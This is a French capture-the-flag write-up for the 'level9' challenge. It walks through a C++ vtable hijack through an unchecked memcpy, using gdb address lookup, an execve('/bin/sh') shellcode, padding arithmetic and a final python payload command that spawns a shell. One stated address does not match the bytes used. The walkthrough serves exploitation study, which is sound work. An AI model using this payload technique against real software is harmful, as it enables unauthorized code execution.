On observe dans notre code les choses suivantes:
Nous avons 2 classes contenant des vtable. a va utiliser memcpy sur notre argv[1] afin d'initialiser son buffer. Nous allons profiter de ce memcpy afin de rediriger les call a la vtable de b vers le buffer de a, et donc, vers un shellcode nous permettant ensuite d'obtenir notre mot de passe.

## Etape 1: Obtenir l'adresse de a

On va chercher une adresse afin de pouvoir mettre un breakpoint juste avant le annotation de a:

```shell
gdb ./level9
disas main
   #0x08048674 <+128>:	mov    %eax,(%esp)
   #0x08048677 <+131>:	call   0x804870e <_ZN1N13setAnnotationEPc>
```

--> On va prendre l'adresse juste avant notre call a annotation, on a l'adresse 0x08048674, on va donc mettre un breakpoint a cette adresse puis lire l'adresse de a:

```shell
gdb ./level9
break *0x08048677
run AAAA
info registers ebx
```

--> On obtient donc l'adresse de a: 0x0804100c (adresse +4 pour acceder directement au buffer) soit \x0c\xa0\x04\x08

## Etape 2: Obtenir le shellcode

--> Trouvable sur internet: \x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80

## Etape 3: Trouver le padding

--> On remarque que notre programme segfault lorsque l'on met une entree > 108 caracteres.

On a donc un padding de : 108 - 4 - 21 = 83


Nous n'avons plus qu'a lancer notre programme:
```shell
./level9 $(python -c 'print "\x0c\xa0\x04\x08" + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A"*83 + "\x0c\xa0\x04\x08"')
```

--> Et nous avons notre flag pour passer aux bonus !